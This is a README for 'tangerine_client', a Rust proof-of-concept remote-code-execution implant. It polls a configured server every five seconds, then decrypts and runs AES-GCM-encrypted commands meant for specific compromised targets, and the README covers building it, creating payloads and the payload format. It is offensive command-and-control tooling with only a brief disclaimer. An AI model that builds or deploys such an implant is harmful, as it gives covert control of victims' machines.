A novel proof of concept mechanism for performing remote code execution on a compromised target written in Rust. In theory, this mechanism allows a client to create tailored payloads for specific clients, which will poll, decrypt, and execute arbitrary code. (No one was harmed in the making of this)

## Usage Instructions

### Prerequisites
- Rust toolchain installed (version 1.81.0 or newer required)
- A server to host the encrypted payloads
- AES-256-GCM encryption key and nonce for each client
- OpenSSL development libraries:
  - **Windows**: Install OpenSSL using vcpkg or the official installer
  - **Linux**: `sudo apt install libssl-dev` (Ubuntu/Debian) or `sudo dnf install openssl-devel` (Fedora)
  - **macOS**: `brew install openssl`

### Building the Client

1. **Set up OpenSSL (Windows only)**:
```powershell
# Option 1: Using vcpkg
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
./bootstrap-vcpkg.bat
./vcpkg install openssl:x64-windows
$env:OPENSSL_DIR = "C:\path\to\vcpkg\installed\x64-windows"
$env:OPENSSL_LIB_DIR = "C:\path\to\vcpkg\installed\x64-windows\lib"

# Option 2: Using official installer
# Download and install from https://slproweb.com/products/Win32OpenSSL.html
$env:OPENSSL_DIR = "C:\Program Files\OpenSSL-Win64"
$env:OPENSSL_LIB_DIR = "C:\Program Files\OpenSSL-Win64\lib"
```

2. **Set up the environment variables** (MUST be set before building):
```bash
# Required variables
export ENCRYPTION_KEY="abcdef0123456789abcdef0123456789"  # 32 bytes
export NONCE="0123456789ab"  # 12 bytes

# Optional variables (will use defaults if not set)
export CLIENT_ID="your-client-id"                    # Will generate UUID v4 if not set
export BASE_URI="https://your-server.com/commands/"  # Defaults to example URI if not set
```

3. **Build the project**:
```bash
# Clean any previous build
cargo clean

# Build from the project root
cargo build --release

# Or from the client directory
cd client
cargo build --release
```

The compiled binary will be available at `target/release/tangerine_client`

### Creating Payloads

1. **Show Client ID**:
```bash
./target/release/tangerine_client "show me the magic tangerine"
```
This will display your client ID.

2. **Create a New Payload**:
```bash
./target/release/tangerine_client "create my tangerine"
```
This creates a template file in `./commands/{client_id}`. Edit this file to add your commands, one per line.

3. **Encrypt the Payload**:
```bash
./target/release/tangerine_client "hide my tangerine"
```
This encrypts the commands and creates `./commands/{client_id}.tangerine`.

### Running the Client
The client can be run in two modes:

1. **Normal Mode** (Remote Execution):
```bash
./target/release/tangerine_client
```
The client will:
- Poll the configured base URI every 5 seconds
- Look for a file named `{client_id}.tangerine`
- Decrypt and execute any new commands found

2. **Development Mode** (Local Testing):
```bash
# Show your client ID
./target/release/tangerine_client "show me the magic tangerine"

# Create a new command template
./target/release/tangerine_client "create my tangerine"

# Encrypt your commands
./target/release/tangerine_client "hide my tangerine"
```
These commands help you create and encrypt payloads for testing purposes.

### Payload Format
The remote payload file (`{client_id}.tangerine`) should be formatted as follows:
```
!TANGERINE_ENC
[encrypted_command_1]
[encrypted_command_2]
...
```

Each line after the header should be encrypted using AES-256-GCM with the client's unique key and nonce.

### Security Notes
- Each client requires a unique encryption key and nonce
- The client ID is used to identify specific targets
- All communication is encrypted using AES-256-GCM
- The system uses ETags to track payload changes

## Disclaimer
This is a proof of concept for educational purposes only. Do not use this code for malicious purposes or on systems you don't own or have permission to access.
